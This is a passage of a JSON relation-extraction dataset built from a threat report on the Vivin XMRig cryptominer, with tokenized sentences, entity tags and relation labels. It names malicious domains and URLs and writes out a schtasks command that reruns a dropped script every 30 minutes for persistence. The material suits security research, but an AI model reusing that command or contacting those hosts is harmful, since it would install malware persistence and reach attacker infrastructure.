["Upon", "successful", "execution", ",", "the", "observed", "samples", "dropped", "both", "a", "JavaScript", "(", "``", "setup.js", "''", ")", "and", "VBScript", "(", "``", "dllm.vbs", "''", ")", "file", "to", "the", "victim", "host", "'s", "\\AppData\\Local\\Temp", "and", "\\Windows\\Start", "Menu\\Programs\\Startup", "folders", "."], ["As", "part", "of", "this", "execution", "chain", ",", "the", "malware", "also", "reaches", "out", "to", "``", "csrss.publicvpn.com", ",", "''", "a", "known", "malicious", "domain", ",", "to", "establish", "a", "TCP", "connection", "."], ["Finally", ",", "in", "addition", "to", "immediately", "running", "the", "malicious", "script", ",", "the", "dropper", "also", "creates", "a", "job", "using", "Windows", "Task", "Scheduler", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "URIs", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "mining", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "malware", "pos": [13, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "XMRig miner", "pos": [6, 8], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "Vivin", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "malware", "pos": [7, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "software", "pos": [14, 15], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "tools", "pos": [16, 17], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [74, 74], "name": "software", "pos": [2, 3], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "sample", "pos": [6, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "payload", "pos": [12, 13], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [92, 92], "name": "setup.exe.", "pos": [20, 21], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [100, 100], "name": "samples", "pos": [6, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [107, 107], "name": "setup.js", "pos": [13, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [114, 114], "name": "dllm.vbs", "pos": [20, 21], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "malware", "pos": [8, 9], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [143, 143], "name": "csrss.publicvpn.com", "pos": [14, 15], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [169, 169], "name": "dropper", "pos": [12, 13], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [173, 173], "name": "job", "pos": [16, 17], "index": "18_0"}]], "labels": [{"r": "CO", "evidence": [0, 1, 2, 3], "h": 2, "t": 5}, {"r": "FR", "evidence": [4], "t": 8, "h": 9}, {"r": "ST", "evidence": [0, 1, 2, 3, 4], "t": 0, "h": 8}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "t": 0, "h": 8}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "t": 1, "h": 8}, {"r": "WR", "evidence": [1, 2, 3, 4], "t": 3, "h": 8}, {"r": "WR", "evidence": [2, 3, 4], "t": 4, "h": 8}, {"r": "WR", "evidence": [3, 4], "t": 5, "h": 8}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 8}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "WR", "evidence": [4], "h": 8, "t": 10}, {"r": "EX", "evidence": [4], "h": 8, "t": 10}, {"r": "CO", "evidence": [4], "h": 10, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 15}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5], "h": 12, "t": 14}, {"r": "ST", "evidence": [6], "h": 15, "t": 16}]}, {"title": "647-1", "sents": [["Detection", "signatures", "can", "also", "prevent", "the", "XMRig", "miner", "from", "being", "dropped", "and", "executed", "on", "targeted", "hosts", "."], ["Once", "the", "initial", "infection", "was", "completed", "``", "Vivin", "''", "quickly", "moved", "to", "common", "Windows", "tools", "."], ["Initial", "infection", "occurs", "through", "the", "execution", "of", "malware", "made", "to", "resemble", "commonly", "used", "productivity", "software", ",", "tools", ",", "and", "games", "."], ["The", "pirated", "software", "from", "our", "observed", "sample", "run", "contains", "a", "second", "stage", "payload", "that", "is", "written", "to", "\\AppData\\Local\\Temp", "as", "``", "setup.exe.", "``"], ["Upon", "successful", "execution", ",", "the", "observed", "samples", "dropped", "both", "a", "JavaScript", "(", "``", "setup.js", "''", ")", "and", "VBScript", "(", "``", "dllm.vbs", "''", ")", "file", "to", "the", "victim", "host", "'s", "\\AppData\\Local\\Temp", "and", "\\Windows\\Start", "Menu\\Programs\\Startup", "folders", "."], ["As", "part", "of", "this", "execution", "chain", ",", "the", "malware", "also", "reaches", "out", "to", "``", "csrss.publicvpn.com", ",", "''", "a", "known", "malicious", "domain", ",", "to", "establish", "a", "TCP", "connection", "."], ["Finally", ",", "in", "addition", "to", "immediately", "running", "the", "malicious", "script", ",", "the", "dropper", "also", "creates", "a", "job", "using", "Windows", "Task", "Scheduler", "."], ["This", "job", ",", "called", "``", "anydesk", "''", "[", "1", "]", "in", "all", "of", "our", "samples", ",", "executes", "the", "dropped", "script", "every", "30", "minutes", ":", "c", ":", "\\windows\\system32\\schtasks.exe", "/create", "/sc", "minute", "/mo", "30", "/tn", "anydesk", "/tr", "c", ":", "\\users\\", "{", "username", "}", "\\appdata\\local", "emp\\setup.jsThe", "malicious", "script", "contains", "an", "obfuscated", "PowerShell", "command", "that", "executes", "a", "number", "of", "cascading", "PowerShell", "calls", "and", "additional", "payload", "stage", "downloads", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "XMRig miner", "pos": [6, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "Vivin", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "malware", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "software", "pos": [14, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "tools", "pos": [16, 17], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [56, 56], "name": "software", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [60, 60], "name": "sample", "pos": [6, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [66, 66], "name": "payload", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "setup.exe.", "pos": [20, 21], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [82, 82], "name": "samples", "pos": [6, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "setup.js", "pos": [13, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [96, 96], "name": "dllm.vbs", "pos": [20, 21], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "malware", "pos": [8, 9], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [125, 125], "name": "csrss.publicvpn.com", "pos": [14, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [151, 151], "name": "dropper", "pos": [12, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [155, 155], "name": "job", "pos": [16, 17], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [166, 166], "name": "anydesk", "pos": [5, 6], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [180, 180], "name": "script", "pos": [19, 20], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [204, 204], "name": "malicious script", "pos": [43, 45], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [209, 209], "name": "PowerShell command", "pos": [48, 50], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [221, 221], "name": "payload", "pos": [60, 61], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [3], "t": 5, "h": 6}, {"r": "WR", "evidence": [0, 1, 2, 3], "t": 0, "h": 5}, {"r": "WR", "evidence": [1, 2, 3], "t": 1, "h": 5}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 5}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 5}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "WR", "evidence": [3], "h": 5, "t": 7}, {"r": "EX", "evidence": [3], "h": 5, "t": 7}, {"r": "CO", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 5, "t": 12}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "h": 9, "t": 11}, {"r": "ST", "evidence": [5], "h": 12, "t": 13}, {"r": "FR", "evidence": [6, 7], "h": 14, "t": 16}, {"r": "EX", "evidence": [6, 7], "t": 15, "h": 16}, {"r": "FR", "evidence": [7], "h": 16, "t": 18}, {"r": "EX", "evidence": [7], "t": 17, "h": 18}, {"r": "FR", "evidence": [7], "h": 18, "t": 19}, {"r": "WR", "evidence": [7], "h": 19, "t": 20}]}, {"title": "647-2", "sents": [["Once", "the", "initial", "infection", "was", "completed", "``", "Vivin", "''", "quickly", "moved", "to", "common", "Windows", "tools", "."], ["Initial", "infection", "occurs", "through", "the", "execution", "of", "malware", "made", "to", "resemble", "commonly", "used", "productivity", "software", ",", "tools", ",", "and", "games", "."], ["The", "pirated", "software", "from", "our", "observed", "sample", "run", "contains", "a", "second", "stage", "payload", "that", "is", "written", "to", "\\AppData\\Local\\Temp", "as", "``", "setup.exe.", "``"], ["Upon", "successful", "execution", ",", "the", "observed", "samples", "dropped", "both", "a", "JavaScript", "(", "``", "setup.js", "''", ")", "and", "VBScript", "(", "``", "dllm.vbs", "''", ")", "file", "to", "the", "victim", "host", "'s", "\\AppData\\Local\\Temp", "and", "\\Windows\\Start", "Menu\\Programs\\Startup", "folders", "."], ["As", "part", "of", "this", "execution", "chain", ",", "the", "malware", "also", "reaches", "out", "to", "``", "csrss.publicvpn.com", ",", "''", "a", "known", "malicious", "domain", ",", "to", "establish", "a", "TCP", "connection", "."], ["Finally", ",", "in", "addition", "to", "immediately", "running", "the", "malicious", "script", ",", "the", "dropper", "also", "creates", "a", "job", "using", "Windows", "Task", "Scheduler", "."], ["This", "job", ",", "called", "``", "anydesk", "''", "[", "1", "]", "in", "all", "of", "our", "samples", ",", "executes", "the", "dropped", "script", "every", "30", "minutes", ":", "c", ":", "\\windows\\system32\\schtasks.exe", "/create", "/sc", "minute", "/mo", "30", "/tn", "anydesk", "/tr", "c", ":", "\\users\\", "{", "username", "}", "\\appdata\\local", "emp\\setup.jsThe", "malicious", "script", "contains", "an", "obfuscated", "PowerShell", "command", "that", "executes", "a", "number", "of", "cascading", "PowerShell", "calls", "and", "additional", "payload", "stage", "downloads", "."], ["In", "the", "sample", "Talos", "originally", "discovered", ",", "the", "command", "reaches", "out", "to", "``", "pastebin.com/raw/gc5dfjh9", ",", "''", "a", "page", "containing", "a", "URL", "of", "a", "supposed", "image", "file", "at", "``", "www.m9c.net/uploads/15758872491.jpg.", "``"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "Vivin", "pos": [7, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "malware", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "software", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "tools", "pos": [16, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "software", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "sample", "pos": [6, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "payload", "pos": [12, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "setup.exe.", "pos": [20, 21], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "samples", "pos": [6, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "setup.js", "pos": [13, 14], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [79, 79], "name": "dllm.vbs", "pos": [20, 21], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "malware", "pos": [8, 9], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [108, 108], "name": "csrss.publicvpn.com", "pos": [14, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [134, 134], "name": "dropper", "pos": [12, 13], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [138, 138], "name": "job", "pos": [16, 17], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [149, 149], "name": "anydesk", "pos": [5, 6], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "script", "pos": [19, 20], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [187, 187], "name": "malicious script", "pos": [43, 45], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [192, 192], "name": "PowerShell command", "pos": [48, 50], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [204, 204], "name": "payload", "pos": [60, 61], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [216, 216], "name": "command", "pos": [8, 9], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [236, 236], "name": "www.m9c.net/uploads/15758872491.jpg.", "pos": [28, 29], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [2], "t": 4, "h": 5}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 6}, {"r": "EX", "evidence": [2], "h": 4, "t": 6}, {"r": "CO", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 11}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 8, "t": 10}, {"r": "ST", "evidence": [4], "h": 11, "t": 12}, {"r": "FR", "evidence": [5, 6], "h": 13, "t": 15}, {"r": "EX", "evidence": [5, 6], "t": 14, "h": 15}, {"r": "FR", "evidence": [6], "h": 15, "t": 17}, {"r": "EX", "evidence": [6], "t": 16, "h": 17}, {"r": "FR", "evidence": [6], "h": 17, "t": 18}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 20}, {"r": "WR", "evidence": [7], "h": 20, "t": 21}]}, {"title": "647-3", "sents": [["Initial", "infection", "occurs", "through", "the", "execution", "of", "malware", "made", "to", "resemble", "commonly", "used", "productivity", "software", ",", "tools", ",", "and", "games", "."], ["The", "pirated", "software", "from", "our", "observed", "sample", "run", "contains", "a", "second", "stage", "payload", "that", "is", "written", "to", "\\AppData\\Local\\Temp", "as", "``", "setup.exe.", "``"], ["Upon", "successful", "execution", ",", "the", "observed", "samples", "dropped", "both", "a", "JavaScript", "(", "``", "setup.js", "''", ")", "and", "VBScript", "(", "``", "dllm.vbs", "''", ")", "file", "to", "the", "victim", "host", "'s", "\\AppData\\Local\\Temp", "and", "\\Windows\\Start", "Menu\\Programs\\Startup", "folders", "."], ["As", "part", "of", "this", "execution", "chain", ",", "the", "malware", "also", "reaches", "out", "to", "``", "csrss.publicvpn.com", ",", "''", "a", "known", "malicious", "domain", ",", "to", "establish", "a", "TCP", "connection", "."], ["Finally", ",", "in", "addition", "to", "immediately", "running", "the", "malicious", "script", ",", "the", "dropper", "also", "creates", "a", "job", "using", "Windows", "Task", "Scheduler", "."], ["This", "job", ",", "called", "``", "anydesk", "''", "[", "1", "]", "in", "all", "of", "our", "samples", ",", "executes", "the", "dropped", "script", "every", "30", "minutes", ":", "c", ":", "\\windows\\system32\\schtasks.exe", "/create", "/sc", "minute", "/mo", "30", "/tn", "anydesk", "/tr", "c", ":", "\\users\\", "{", "username", "}", "\\appdata\\local", "emp\\setup.jsThe", "malicious", "script", "contains", "an", "obfuscated", "PowerShell", "command", "that", "executes", "a", "number", "of", "cascading", "PowerShell", "calls", "and", "additional", "payload", "stage", "downloads", "."], ["In", "the", "sample", "Talos", "originally", "discovered", ",", "the", "command", "reaches", "out", "to", "``", "pastebin.com/raw/gc5dfjh9", ",", "''", "a", "page", "containing", "a", "URL", "of", "a", "supposed", "image", "file", "at", "``", "www.m9c.net/uploads/15758872491.jpg.", "``"], ["These", "PowerShell", "commands", "reflectively", "load", "an", "included", "malicious", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "malware", "pos": [7, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "software", "pos": [14, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "tools", "pos": [16, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "software", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "sample", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "payload", "pos": [12, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "setup.exe.", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "samples", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [56, 56], "name": "setup.js", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "dllm.vbs", "pos": [20, 21], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "malware", "pos": [8, 9], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [92, 92], "name": "csrss.publicvpn.com", "pos": [14, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [118, 118], "name": "dropper", "pos": [12, 13], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [122, 122], "name": "job", "pos": [16, 17], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [133, 133], "name": "anydesk", "pos": [5, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "script", "pos": [19, 20], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [171, 171], "name": "malicious script", "pos": [43, 45], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [176, 176], "name": "PowerShell command", "pos": [48, 50], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [188, 188], "name": "payload", "pos": [60, 61], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [200, 200], "name": "command", "pos": [8, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [220, 220], "name": "www.m9c.net/uploads/15758872491.jpg.", "pos": [28, 29], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [223, 223], "name": "PowerShell commands", "pos": [1, 3], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "EX", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 10}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "FR", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "EX", "evidence": [4, 5], "t": 13, "h": 14}, {"r": "FR", "evidence": [5], "h": 14, "t": 16}, {"r": "EX", "evidence": [5], "t": 15, "h": 16}, {"r": "FR", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "RD", "evidence": [6, 7], "t": 20, "h": 21}]}, {"title": "647-4", "sents": [["The", "pirated", "software", "from", "our", "observed", "sample", "run", "contains", "a", "second", "stage", "payload", "that", "is", "written", "to", "\\AppData\\Local\\Temp", "as", "``", "setup.exe.", "``"], ["Upon", "successful", "execution", ",", "the", "observed", "samples", "dropped", "both", "a", "JavaScript", "(", "``", "setup.js", "''", ")", "and", "VBScript", "(", "``", "dllm.vbs", "''", ")", "file", "to", "the", "victim", "host", "'s", "\\AppData\\Local\\Temp", "and", "\\Windows\\Start", "Menu\\Programs\\Startup", "folders", "."], ["As", "part", "of", "this", "execution", "chain", ",", "the", "malware", "also", "reaches", "out", "to", "``", "csrss.publicvpn.com", ",", "''", "a", "known", "malicious", "domain", ",", "to", "establish", "a", "TCP", "connection", "."], ["Finally", ",", "in", "addition", "to", "immediately", "running", "the", "malicious", "script", ",", "the", "dropper", "also", "creates", "a", "job", "using", "Windows", "Task", "Scheduler", "."], ["This", "job", ",", "called", "``", "anydesk", "''", "[", "1", "]", "in", "all", "of", "our", "samples", ",", "executes", "the", "dropped", "script", "every", "30", "minutes", ":", "c", ":", "\\windows\\system32\\schtasks.exe", "/create", "/sc", "minute", "/mo", "30", "/tn", "anydesk", "/tr", "c", ":", "\\users\\", "{", "username", "}", "\\appdata\\local", "emp\\setup.jsThe", "malicious", "script", "contains", "an", "obfuscated", "PowerShell", "command", "that", "executes", "a", "number", "of", "cascading", "PowerShell", "calls", "and", "additional", "payload", "stage", "downloads", "."], ["In", "the", "sample", "Talos", "originally", "discovered", ",", "the", "command", "reaches", "out", "to", "``", "pastebin.com/raw/gc5dfjh9", ",", "''", "a", "page", "containing", "a", "URL", "of", "a", "supposed", "image", "file", "at", "``", "www.m9c.net/uploads/15758872491.jpg.", "``"], ["These", "PowerShell", "commands", "reflectively", "load", "an", "included", "malicious", "."], ["The", "sample", "then", "calls", "the", "``", "exe", "''", "method", "of", "the", "``", "Hackitup", "''", "class", "shown", "below", ",", "which", "performs", "more", "deobfuscation", ",", "in", "addition", "to", "some", "additional", "logic", "checks", "through", "more", "chained", "method", "calls", ",", "such", "as", "whether", "it", "'s", "running", "on", "a", "32-", "or", "64-bit", "architecture", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "software", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "sample", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "payload", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "setup.exe.", "pos": [20, 21], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "samples", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "setup.js", "pos": [13, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "dllm.vbs", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [65, 65], "name": "malware", "pos": [8, 9], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [71, 71], "name": "csrss.publicvpn.com", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "dropper", "pos": [12, 13], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "job", "pos": [16, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [112, 112], "name": "anydesk", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [126, 126], "name": "script", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [150, 150], "name": "malicious script", "pos": [43, 45], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [155, 155], "name": "PowerShell command", "pos": [48, 50], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [167, 167], "name": "payload", "pos": [60, 61], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [179, 179], "name": "command", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [199, 199], "name": "www.m9c.net/uploads/15758872491.jpg.", "pos": [28, 29], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [202, 202], "name": "PowerShell commands", "pos": [1, 3], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [211, 211], "name": "sample", "pos": [1, 2], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [222, 222], "name": "Hackitup", "pos": [12, 13], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "EX", "evidence": [3, 4], "t": 10, "h": 11}, {"r": "FR", "evidence": [4], "h": 11, "t": 13}, {"r": "EX", "evidence": [4], "t": 12, "h": 13}, {"r": "FR", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "RD", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "RD", "evidence": [5, 6, 7], "t": 17, "h": 19}]}, {"title": "647-5", "sents": [["Upon", "successful", "execution", ",", "the", "observed", "samples", "dropped", "both", "a", "JavaScript", "(", "``", "setup.js", "''", ")", "and", "VBScript", "(", "``", "dllm.vbs", "''", ")", "file", "to", "the", "victim", "host", "'s", "\\AppData\\Local\\Temp", "and", "\\Windows\\Start", "Menu\\Programs\\Startup", "folders", "."], ["As", "part", "of", "this", "execution", "chain", ",", "the", "malware", "also", "reaches", "out", "to", "``", "csrss.publicvpn.com", ",", "''", "a", "known", "malicious", "domain", ",", "to", "establish", "a", "TCP", "connection", "."], ["Finally", ",", "in", "addition", "to", "immediately", "running", "the", "malicious", "script", ",", "the", "dropper", "also", "creates", "a", "job", "using", "Windows", "Task", "Scheduler", "."], ["This", "job", ",", "called", "``", "anydesk", "''", "[", "1", "]", "in", "all", "of", "our", "samples", ",", "executes", "the", "dropped", "script", "every", "30", "minutes", ":", "c", ":", "\\windows\\system32\\schtasks.exe", "/create", "/sc", "minute", "/mo", "30", "/tn", "anydesk", "/tr", "c", ":", "\\users\\", "{", "username", "}", "\\appdata\\local", "emp\\setup.jsThe", "malicious", "script", "contains", "an", "obfuscated", "PowerShell", "command", "that", "executes", "a", "number", "of", "cascading", "PowerShell", "calls", "and", "additional", "payload", "stage", "downloads", "."], ["In", "the", "sample", "Talos", "originally", "discovered", ",", "the", "command", "reaches", "out", "to", "``", "pastebin.com/raw/gc5dfjh9", ",", "''", "a", "page", "containing", "a", "URL", "of", "a", "supposed", "image", "file", "at", "``", "www.m9c.net/uploads/15758872491.jpg.", "``"], ["These", "PowerShell", "commands", "reflectively", "load", "an", "included", "malicious", "."], ["The", "sample", "then", "calls", "the", "``", "exe", "''", "method", "of", "the", "``", "Hackitup", "''", "class", "shown", "below", ",", "which", "performs", "more", "deobfuscation", ",", "in", "addition", "to", "some", "additional", "logic", "checks", "through", "more", "chained", "method", "calls", ",", "such", "as", "whether", "it", "'s", "running", "on", "a", "32-", "or", "64-bit", "architecture", "."], ["Finally", ",", "it", "constructs", "the", "configuration", "options", "to", "be", "loaded", "and", "executed", "with", "its", "final", "payload", "by", "invoking", "``", "cmd.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "samples", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "setup.js", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 